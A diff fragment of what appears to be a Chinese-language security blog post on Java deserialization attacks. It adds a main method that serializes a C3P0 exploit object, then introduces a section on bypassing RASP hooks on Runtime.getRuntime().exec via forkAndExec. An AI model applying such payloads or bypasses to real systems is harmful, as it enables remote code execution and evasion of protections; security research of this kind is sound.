@@ -210,6 +210,11 @@ deserialization_blacklist<span class="punctuation">:</span> <span class="punctua
         &#125;
     &#125;
 
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;
+        <span class="type">C3P0</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();
+        serialize(exp);
+    &#125;
+
 &#125;</code></pre>
 
 <h2 id="绕过RASP对Runtime-getRuntime-exec的插桩"><a href="#绕过RASP对Runtime-getRuntime-exec的插桩" class="headerlink" title="绕过RASP对Runtime.getRuntime().exec的插桩"></a>绕过RASP对Runtime.getRuntime().exec的插桩</h2><p>在linux下主要使用forkAndExec,Exp如下</p>
